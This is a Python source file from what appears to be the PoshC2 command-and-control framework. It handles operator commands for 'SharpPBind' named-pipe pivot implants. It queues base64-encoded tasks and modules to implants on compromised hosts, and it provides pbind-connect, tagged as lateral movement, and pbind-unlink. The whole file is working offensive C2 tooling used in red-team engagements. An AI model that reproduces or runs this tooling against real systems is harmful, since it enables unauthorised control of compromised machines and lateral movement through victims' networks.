import base64
from prompt_toolkit import PromptSession
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.history import FileHistory
from prompt_toolkit.styles import Style

from poshc2.Utils import get_command_word, command
from poshc2.client.Alias import cs_alias, cs_replace
from poshc2.client.cli.AutosuggestionAggregator import AutosuggestionAggregator
from poshc2.client.cli.CommandPromptCompleter import FirstWordCompleter
from poshc2.client.cli.PoshExamplesAutosuggestions import AutoSuggestFromPoshExamples
from poshc2.client.command_handlers.CommandTags import Tag
from poshc2.server.AutoLoads import check_module_loaded, run_sharp_autoloads
from poshc2.client.command_handlers.CommonCommands import common_implant_commands, common_implant_commands_help, common_implant_examples, common_block_help
from poshc2.client.command_handlers.SharpHandler import commands as sharp_commands, examples as sharp_examples
from poshc2.server.Config import PoshProjectDirectory, UserAgent, PBindPipeName, PBindSecret, FCommFilePath
from poshc2.server.Core import get_parent_implant, print_bad, load_module, load_module_sharp
from poshc2.server.ImplantType import ImplantType
from poshc2.server.database.Helpers import insert_object, get_implant_by_numeric_id, update_object, select_first, get_loaded_modules
from poshc2.server.database.Model import NewTask, Implant, C2Server, NewTask, URL

commands = {}
commands.update(common_implant_commands)
commands.update(sharp_commands)
commands_help = {}
commands_help.update(common_implant_commands_help)
examples = []
examples.extend(sharp_examples)
examples.extend(common_implant_examples)
block_help = {}
block_help.update(common_block_help)

style = Style.from_dict({
    '': '#008ECC',
})

autosuggester = AutoSuggestFromPoshExamples(examples)


def pb_prompt(prefix):
    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/{ImplantType.SharpPBind.get_history_file()}'),
                            auto_suggest=AutosuggestionAggregator([AutoSuggestFromHistory(), autosuggester]), style=style)
    completions = list(commands.keys())
    completions.extend(examples)
    return session.prompt(f'{prefix}> ', completer=FirstWordCompleter(completions, WORD=True))


def handle_pbind_command(command, user, parent_implant_id, handler_numeric_id):
    parent_implant = get_parent_implant(parent_implant_id)
    parent_implant_type = ImplantType.get(parent_implant.type)
    implant = get_implant_by_numeric_id(handler_numeric_id)
    command = command.strip()

    command_word = get_command_word(command)

    if command_word == "hide-implant" or command_word == "unhide-implant":
        commands[command_word](user, command, implant.id, None)
        return

    if not parent_implant:
        print("Could not find parent implant for this pbind implant - does it need linking to?")
        return

    for alias in cs_alias:
        if alias[0] == command[:len(command.rstrip())]:
            command = alias[1]

    for alias in cs_replace:
        if command.startswith(alias[0]):
            command = command.replace(alias[0], alias[1])

    if parent_implant_type == ImplantType.SharpPBind:
        parent_implant = get_parent_implant(parent_implant.id)    
        parent_implant_type = ImplantType.get(parent_implant.type)
        if parent_implant_type == ImplantType.SharpPBind:
            print_bad("Third layer pivot not implemented")
            return
        module_name = "Stage2-Core.exe"
        modules_loaded = get_loaded_modules(parent_implant.id)

        if modules_loaded:
            new_modules_loaded = f"{modules_loaded} {module_name}"

            if module_name not in modules_loaded:
                base64_module = load_module_sharp(module_name)
                pbind_command = f"run-exe PBind PBind \"99999load-module{base64_module}\"" 
                base64_pbind_command = base64.b64encode(pbind_command.encode("utf-8")).decode("utf-8")
                base64_pbind_command = "99999" + base64_pbind_command
                new_task = NewTask(
                implant_id=parent_implant.id,
                command=f"run-exe PBind PBind {base64_pbind_command}",
                user=user,
                child_implant_id=None
                )
                insert_object(new_task)
                update_object(Implant, {Implant.loaded_modules: new_modules_loaded}, {Implant.id: parent_implant.id})

        if command_word.startswith("load-module"):
            if " " in command:
                module_name = command.split()[1]
                if modules_loaded:
                    new_modules_loaded = f"{modules_loaded} {module_name}"

                    if module_name not in modules_loaded:
                        base64_module = load_module_sharp(module_name)
                        pbind_command = f"run-exe PBind PBind \"99999load-module{base64_module}\"" 
                        base64_pbind_command = base64.b64encode(pbind_command.encode("utf-8")).decode("utf-8")
                        base64_pbind_command = "99999" + base64_pbind_command
                        new_task = NewTask(
                        implant_id=parent_implant.id,
                        command=f"run-exe PBind PBind {base64_pbind_command}",
                        user=user,
                        child_implant_id=None
                        )
                        insert_object(new_task)
                        update_object(Implant, {Implant.loaded_modules: new_modules_loaded}, {Implant.id: parent_implant.id})
                    else:
                        print_bad("Please provide a module to load")
                    return

        else:
            base64_pbind_command = base64.b64encode(command.encode("utf-8")).decode("utf-8")
            base64_pbind_command = "99999" + base64_pbind_command
            command = f"run-exe PBind PBind {base64_pbind_command}"

    run_sharp_autoloads(command, parent_implant.id, user, load_module_command=f"pbind-load-module {handler_numeric_id} ")

    if command_word.startswith("load-module"):
        if " " in command:
            module_name = command.split()[1]
            new_task = NewTask(
                implant_id=parent_implant.id,
                command=f"pbind-load-module {handler_numeric_id} {module_name}",
                user=user,
                child_implant_id=None
            )

            insert_object(new_task)
        else:
            print_bad("Please provide a module to load")
        return

    if command_word in commands:
        if command_word in common_implant_commands:
            commands[command_word](user, command, implant.id, f"pbind-command {handler_numeric_id}")
        else:
            commands[command_word](user, command, parent_implant.id, f"pbind-command {handler_numeric_id}")

        if command_word == "pbind-unlink":
            update_object(Implant, {Implant.label: "Parent: Unlinked"}, {Implant.id: implant.id})
        return



    if command:
        new_task = NewTask(
            implant_id=parent_implant.id,
            command=f"pbind-command {handler_numeric_id} {command}",
            user=user,
            child_implant_id=None
        )

        insert_object(new_task)


def get_commands():
    return commands.keys()


@command(commands, commands_help, examples, block_help, tags=[Tag.PBind])
def do_pbind_unlink(user, command, implant_id, command_prefix=""):
    """
    Unlinks this pbind instance from the parent so that either end can
    connect to a different instance.

    Example:
        pbind-unlink
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Lateral_Movement])
def do_pbind_connect(user, command, implant_id, command_prefix=""):
    """
    Connect to a PBind implant waiting on a target.

    If no pipename and secret are passed then the defaults are used from the configuration file
    (which are used by default in payloads).

    MITRE TTPs:
        {}

    Examples:
        pbind-connect hostname
        pbind-connect hostname <pipename> <secret>
    """

    key = select_first(C2Server.encryption_key)
    check_module_loaded("PBind.exe", implant_id, user, force=True, load_module_command=command_prefix)

    if len(command.split()) == 2:  # 'pbind-connect <hostname>' is two args
        command = f"{command} {PBindPipeName} {PBindSecret} {key}"
    elif len(command.split()) == 4:  # if the pipe name and secret are already present just add the key
        command = f"{command} {key}"
    else:
        print_bad("Expected 'pbind-connect <hostname>' or 'pbind-connect <hostname> <pipename> <secret>'")
        return
    
    command = command.replace("pbind-connect","pbind-command run-exe PBind PBind start")

    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)